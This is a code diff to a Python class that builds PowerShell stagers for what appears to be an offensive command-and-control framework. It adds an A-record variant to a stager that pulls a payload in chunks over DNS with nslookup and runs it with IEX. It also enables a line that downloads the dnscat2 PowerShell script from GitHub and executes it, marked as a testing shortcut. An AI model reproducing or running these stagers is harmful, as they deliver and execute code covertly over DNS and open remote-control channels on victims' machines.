@@ -234,15 +234,27 @@ class PlatformPowershell(Platform, ModuleBase):
         elif self.handler.options['TRANSPORT']['Value'] == "DNS":
             zone = self.handler.transport.options['ZONE']['Value'].rstrip(".")
             server = self.handler.transport.options['DNSSERVER']['Value']
-            print_debug(DEBUG_MODULE, "zone = {}, server = {}".format(zone, server))
+            dnstype = self.handler.transport.options['DNSTYPE']['Value']
+            print_debug(DEBUG_MODULE, "zone = {}, server = {}, dnstype = {}".format(zone, server, dnstype))
             if server is None:
                 server = ""
 
             # TODO: Consider using helps.randomize_capitalization(...)
-            stager = '$a="";for($i=0;;$i++){'
-            stager += '$c=([string](IEX "nslookup -type=TXT s$($i).{}. {}")).Split({})[1];'.format(zone, server, "'\"'")
-            stager += 'if(!$c){break;}$a+=$c;}'
-            stager += '$a=[Convert]::FromBase64String($a);'
+            stager = ''
+            if dnstype == "TXT":
+                stager += '$a="";for($i=0;;$i++){'
+                stager += '$c=([string](IEX "nslookup -type=TXT s$($i).{}. {}")).Split({})[1];'.format(zone, server, "'\"'")
+                stager += 'if(!$c){break;}$a+=$c;}'
+                stager += '$a=[Convert]::FromBase64String($a);'
+            elif dnstype == "A":
+                stager += '$a=New-Object char[](0);for($i=0;;$i++){'
+                stager += '$c=([regex]"\s+").Split([string](IEX "nslookup -type=A s$($i).{}. {}"));'.format(zone, server)
+                stager += 'if($c.Length-lt7-or$c.Length-gt11){break;}$a+=$c[-2].Split(".")}'
+                stager += '$a=$a|%{[Convert]::ToInt32($_)};'
+            else:
+                print_error("invalid DNSTYPE")
+                return None
+
             stager += '$b=$a.Length;'
 
         # combination platform / transport currently not supported
@@ -386,8 +398,8 @@ class PlatformPowershell(Platform, ModuleBase):
         f.close()
 
         # or if you do not want to wait for ever for testing, TODO: remove!!!
-        #agent = "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/' +
-        # 'lukebaggett/dnscat2-powershell/master/dnscat2.ps1');"
+        agent = "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/" +\
+                "lukebaggett/dnscat2-powershell/master/dnscat2.ps1');"
 
         zone = self.handler.transport.options['ZONE']['Value'].rstrip(".")
         server = self.handler.transport.options['DNSSERVER']['Value']
